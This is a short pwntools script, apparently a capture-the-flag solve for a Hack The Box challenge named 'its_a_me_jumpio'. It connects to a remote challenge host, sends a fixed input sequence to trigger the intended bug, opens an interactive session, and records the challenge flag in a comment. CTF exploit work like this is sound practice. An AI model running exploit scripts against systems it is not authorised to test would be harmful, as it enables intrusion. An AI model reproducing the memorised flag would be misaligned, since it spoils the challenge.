#!/usr/bin/env python3

from pwn import *

exe = ELF('./its_a_me_jumpio')
libc = ELF('./glibc/libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
'''

p = remote("94.237.57.115", 45252)
#p = process('./its_a_me_jumpio')
#p = gdb.debug('./its_a_me_jumpio', gdbscript = script)
#debug()

for i in range(10):
	s(b"W")

sl(b"2")
s(b"1")

p.interactive()
#HTB{h3ll0_1t5_4_m3_Jump10o00o}
